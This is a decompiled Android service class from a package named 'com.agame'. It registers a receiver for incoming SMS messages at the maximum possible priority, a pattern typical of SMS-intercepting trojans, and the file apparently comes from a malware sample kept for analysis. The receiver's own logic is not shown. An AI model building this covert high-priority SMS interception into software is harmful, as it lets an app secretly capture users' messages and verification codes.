// Decompiled by JEB v1.5.201408040 - http://www.android-decompiler.com

package com.agame;

import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;

public class TMyService extends Service {
    private TRecevier smsReceiver;

    public TMyService() {
        super();
    }

    public IBinder onBind(Intent arg0) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        IntentFilter v0 = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        v0.setPriority(2147483647);
        this.smsReceiver = new TRecevier();
        this.registerReceiver(this.smsReceiver, v0);
    }

    public void onDestroy() {
        super.onDestroy();
        this.unregisterReceiver(this.smsReceiver);
    }
}

